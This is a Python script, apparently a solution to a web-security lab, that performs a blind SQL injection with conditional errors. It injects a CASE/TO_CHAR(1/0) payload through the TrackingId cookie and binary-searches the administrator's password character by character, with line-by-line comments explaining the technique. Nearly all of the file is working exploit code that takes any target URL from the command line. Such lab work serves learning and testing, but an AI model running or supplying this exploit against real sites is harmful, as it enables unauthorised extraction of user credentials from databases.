#!/usr/bin/env/[python3]
# -*- coding: utf-8 -*-

import requests
import sys

""" Blind SQL injection with conditional errors"""
"""The code below is a Python script that performs a blind SQL injection attack on a web application. The script takes a base URL as a command line argument and then iterates through the characters of the password for the administrator account. 

The `get_char` function sends a GET request to the web application with a specially crafted cookie that contains a SQL injection attack. The SQL injection attack is designed to extract a single character of the password for the administrator account. The function returns `True` if the character being tested is greater than the guessed character, and `False` otherwise.

The `main` function sets up a loop that iterates through the characters of the password. For each character, it performs a binary search to guess the correct character. The binary search starts by guessing the middle character of the ASCII table, and then adjusts the search range based on the result of the `get_char` function. If the result is `True`, the search range is adjusted to the upper half of the range, and if the result is `False`, the search range is adjusted to the lower half of the range. The search continues until the search range is reduced to a single character, at which point the correct character has been found.

Once the correct character has been found, it is added to the password string. The loop then continues to the next character until the entire password has been guessed. If the script is unable to guess the next character, it prints the current password and exits."""

def get_char(base_url:str, i:int, character:int) -> bool:
    response = requests.get(
        base_url,
        cookies={"TrackingId": f"1'||(SELECT CASE WHEN (SUBSTR(password, {i}, 1) > '{chr(character)}') THEN TO_CHAR(1/0) ELSE 'NULL' END FROM users WHERE username = 'administrator')||'"},#this is the cookie which is being sent to the server, the tracking id is being set to 1 and then the sql statement is being injected
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, #this is a dict object, used for Burp
        verify=False,
        )
    return "Internal Server Error" in response.text

def main() -> None: 
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>") #this is the usage statement if the user does not enter the correct number of arguments
        exit(1)
    requests.packages.urllib3.disable_warnings()
    password = "" #this is the password which will be built up
    for i in range(1,100): #this is the loop which will iterate through the characters in the password
        min_char = 32 #this is the min character in the ascii table. 
        max_char = 127 #this is the max character in the ascii table, so the max char of what the password could be
        while min_char != max_char: #when min char= max char then we have found the character
            
            char = (min_char + max_char) // 2 #this is the middle of the range of characters, ie looking for the middle of the ascii table (127) eg for a to z looking for m
            result= get_char(sys.argv[1].rstrip("/"),i,char) #this is the base url, the rstrip removes the / from the end of the url if it is there, also i and char are called here
            
            if result: #if the result is true then the char is greater than the char we are looking for
                min_char = char+1 #so the min char is now the char we are looking for, as the min needs to go up to the char we are looking for
            else:
                max_char = char #if the result is false then the max char is now the char we are looking for, as the max needs to go down to the char we are looking for
        result= get_char(sys.argv[1].rstrip("/"),i,char-1)# this checks if the value is true by checking is its greater than the previous one, when min char = max char
        if result:
            password =password+chr(min_char) #this is the password which will be built up, we are convertng it as 41 is ASCII is A, we're adding on the letter to the password
        else:
            print(password)
            return
if __name__ == "__main__":
    main()

